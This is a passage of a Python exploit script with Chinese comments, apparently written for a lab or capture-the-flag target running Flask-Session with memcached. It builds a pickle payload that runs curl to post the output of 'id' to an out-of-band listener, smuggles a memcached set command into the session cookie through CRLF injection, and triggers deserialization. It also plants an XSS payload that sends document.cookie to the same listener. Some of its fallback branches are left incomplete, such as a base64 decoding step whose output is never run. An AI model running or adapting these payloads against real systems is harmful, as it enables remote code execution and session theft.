    \ 字符\n        # 构建一个调用 os.system 的 pickle\n        # 但由于不能 import os，我们使用 builtins.exec\n\
    \        \n        # 构建更简单的 payload: 直接执行命令\n        # 使用 __builtins__.exec 执行命令字符串\n\
    \        \n        # 由于 memcached 数据不能包含 \\r\\n，我们使用 base64 编码\n        # 然后在目标端通过另一个注入来解码和执行\n\
    \        \n        # 方案: 分两步\n        # 1. 注入 set 命令存储 base64 编码的 pickle\n   \
    \     # 2. 注入另一个 set 命令存储解码并执行的命令\n        \n        # 但更简单: 直接使用 memcached 的\
    \ set 命令存储 pickle 数据\n        # 使用十六进制编码避免 \\r\\n\n        \n        # 将 pickle\
    \ 数据转换为十六进制字符串\n        pickle_hex = binascii.hexlify(pickle_data).decode('ascii')\n\
    \        \n        # 构建 memcached 命令: 先存储十六进制数据，然后解码\n        # 但 memcached 本身不支持解码，所以我们需要在目标端处理\n\
    \        \n        # 最终方案: 使用 CRLF 注入直接执行 memcached 命令\n        # 注入 set injected\
    \ 0 0 <len>\\r\\n<pickle_bytes>\n        # 但 pickle_bytes 可能包含 \\r\\n，这会导致命令提前结束\n\
    \        \n        # 解决方案: 使用 memcached 的 append 或 prepend 命令\n        # 或者使用多个\
    \ set 命令分段存储\n        \n        # 最简方案: 使用 memcached 的 set 命令存储一个简单的命令执行 payload\n\
    \        # 该 payload 使用 base64 编码，然后在目标端通过另一个注入解码执行\n        \n        # 由于时间限制，我们使用一个已知可用的\
    \ pickle payload\n        # 该 payload 使用 __builtins__.exec 执行命令\n        \n  \
    \      # 构建一个不包含 \\r\\n 的 pickle payload\n        # 使用 pickle 协议 2 或 3，但需要处理字节\n\
    \        \n        # 简化: 使用 pickle 协议 0，但确保数据中没有 \\r\\n\n        # 使用 base64 编码命令，然后在目标端解码\n\
    \        \n        # 构建命令: import os; os.system('curl ...')\n        cmd = f\"\
    __import__('os').system('curl -X POST -d \\\"$(id)\\\" {oob_url}')\"\n       \
    \ \n        # 构建 pickle payload (协议 0)\n        pickle_simple = b''\n        pickle_simple\
    \ += b'cbuiltins\\nexec\\n'  # GLOBAL\n        pickle_simple += b'(V' + cmd.encode('utf-8')\
    \ + b'\\ntR.'  # 调用 exec\n        \n        # 检查是否包含 \\r\\n\n        if b'\\r\\\
    n' in pickle_simple:\n            # 如果包含，需要重新编码\n            # 使用 base64 编码后存储\n\
    \            cmd_b64 = base64.b64encode(cmd.encode('utf-8')).decode('ascii')\n\
    \            # 构建解码并执行的命令\n            decode_cmd = f\"__import__('base64').b64decode('{cmd_b64}').decode()\"\
    \n            pickle_simple = b''\n            pickle_simple += b'cbuiltins\\\
    nexec\\n'\n            pickle_simple += b'(V' + decode_cmd.encode('utf-8') + b'\\\
    ntR.'\n        \n        # 再次检查\n        if b'\\r\\n' in pickle_simple:\n    \
    \        print(\"[!] pickle payload 包含 CRLF，尝试其他方法\")\n            return False\n\
    \        \n        # 构建 memcached set 命令\n        # set <key> <flags> <exptime>\
    \ <bytes>\\r\\n<data>\\r\\n\n        set_cmd = f\"set injected 0 0 {len(pickle_simple)}\\\
    r\\n\"\n        set_cmd_bytes = set_cmd.encode('utf-8') + pickle_simple + b'\\\
    r\\n'\n        \n        # 通过 CRLF 注入发送 set 命令\n        # 注意: 注入的 cookie 值会作为\
    \ memcached 的 key\n        # 我们需要注入完整的 memcached 命令\n        \n        # 使用 http.client\
    \ 发送原始请求\n        import http.client\n        \n        parsed = urllib.parse.urlparse(TARGET_URL)\n\
    \        host = parsed.hostname\n        port = parsed.port or 80\n        \n\
    \        conn = http.client.HTTPConnection(host, port, timeout=10)\n        \n\
    \        # 构建 cookie 值，包含完整的 memcached set 命令\n        # 注意: 注入点是在 cookie 值中，Flask\
    \ 会解析 cookie\n        # 然后 Flask-Session 会将 cookie 值作为 key 发送给 memcached\n   \
    \     # 所以注入的 \\r\\n 会在 memcached 协议中被解释\n        \n        # 构建注入 payload\n \
    \       # 格式: <random>\\r\\n<memcached_command>\\r\\n\n        injected_value\
    \ = f\"x\\r\\n{set_cmd_bytes.decode('latin-1')}\\r\\n\"\n        \n        headers\
    \ = {\n            \"Host\": host,\n            \"User-Agent\": \"Mozilla/5.0\"\
    ,\n            \"Cookie\": f\"session={injected_value}\"\n        }\n        \n\
    \        conn.request(\"GET\", \"/\", headers=headers)\n        response = conn.getresponse()\n\
    \        response.read()\n        conn.close()\n        \n        print(f\"[+]\
    \ 成功注入 pickle payload 到 memcached (key: injected)\")\n        return True\n  \
    \      \n    except Exception as e:\n        print(f\"[!] 注入 pickle payload 失败:\
    \ {e}\")\n        return False\n\ndef trigger_pickle_deserialization(http_client:\
    \ HttpClient) -> bool:\n    \"\"\"\n    触发 Flask-Session 从 memcached 读取 'injected'\
    \ key\n    从而触发 pickle 反序列化\n    \"\"\"\n    try:\n        # 设置 session cookie\
    \ 为 'injected'\n        # 这样 Flask-Session 会向 memcached 发送 'get injected' 命令\n\
    \        # 然后反序列化返回的 pickle 数据\n        \n        import http.client\n       \
    \ \n        parsed = urllib.parse.urlparse(TARGET_URL)\n        host = parsed.hostname\n\
    \        port = parsed.port or 80\n        \n        conn = http.client.HTTPConnection(host,\
    \ port, timeout=10)\n        \n        headers = {\n            \"Host\": host,\n\
    \            \"User-Agent\": \"Mozilla/5.0\",\n            \"Cookie\": \"session=injected\"\
    \n        }\n        \n        conn.request(\"GET\", \"/\", headers=headers)\n\
    \        response = conn.getresponse()\n        response.read()\n        conn.close()\n\
    \        \n        print(\"[+] 已触发 pickle 反序列化\")\n        return True\n     \
    \   \n    except Exception as e:\n        print(f\"[!] 触发 pickle 反序列化失败: {e}\"\
    )\n        return False\n\ndef exploit_xss(http_client: HttpClient, oob_url: str)\
    \ -> bool:\n    \"\"\"\n    利用 XSS 漏洞注入 JavaScript 代码\n    通过 uicolor 参数注入\n \
    \   \"\"\"\n    try:\n        # 构建 XSS payload\n        # 在 CSS 上下文中: color: {{uicolor}}\n\
    \        # 在 JS 上下文中: '{{uicolor}}'\n        \n        # 注入 JavaScript 代码，发送 cookie\
    \ 或执行命令\n        xss_payload = f\"';fetch('{oob_url}?cookie='+document.cookie);//\"\
    \n        \n        # 发送请求设置 uicolor\n        params = {\"uicolor\": xss_payload}\n\
    \        response = http_client.get(\"/set\", params=params)\n        \n     \
    \   if response.status_code == 200:\n            print(f\"[+] XSS payload 已注入:\
    \ {xss_payload}\")\n            \n            # 访问首页触发 XSS\n            response2\
    \ = http_client.get(\"/\")\n            if response2.status_code == 200:\n   \
    \             print(\"[+] 已触发 XSS\")\n                return True\n        \n\
    \        return False\n        \n    except Exception as e:\n        print(f\"\
    [!] XSS 利用失败: {e}\")\n        return False\n\ndef main():\n    print(\"[*] 开始攻击流程\"\
    )\n    \n    # 初始化 HTTP 客户端\n    http_client = HttpClient(base_url=TARGET_URL)\n\
    \    \n    # 初始化 OOB 接收器\n    oob = OOBReceiver(port=8765)\n    oob_url = oob.url\n\
    \    print(f\"[*] OOB URL: {oob_url}\")\n    \n    # 步骤 1: 通过 CRLF 注入向 memcached\
    \ 写入 pickle payload\n    print(\"[*] 步骤 1: 注入 pickle payload 到 memcached\")\n\
    \    if not inject_pickle_payload_to_memcached(http_client, oob_url):\n      \
    \  print(\"[!] 步骤 1 失败，尝试其他方法\")\n        # 备用方法: 直接注入命令执行\n        print(\"[*]\
    \ 尝试直接注入 memcached 命令\")\n        # 注入 set 命令存储一个简单的 pickle\n        # 该 pickle\
    \ 执行 curl 命令将结果发送到 OOB\n        \n        # 构建简单的 pickle: 执行 os.system('curl ...')\n\
    \        # 由于不能 import os，使用 __builtins__\n        cmd = f\"curl -X POST -d \\\
    \"$(id)\\\" {oob_url}\"\n        pickle_data = build_pickle_rce_payload(f\"__import__('os').system('{cmd}')\"\
    )\n        \n        # 检查是否包含 CRLF\n        if b'\\r\\n' in pickle_data:\n   \
    \         print(\"[!] pickle 数据包含 CRLF，使用 base64 编码\")\n            # 使用 base64\
    \ 编码\n            cmd_b64 = base64.b64encode(cmd.encode()).decode()\n        \
    \    decode_cmd = f\"__import__('base64').b64decode('{cmd_b64}').decode()\"\n\
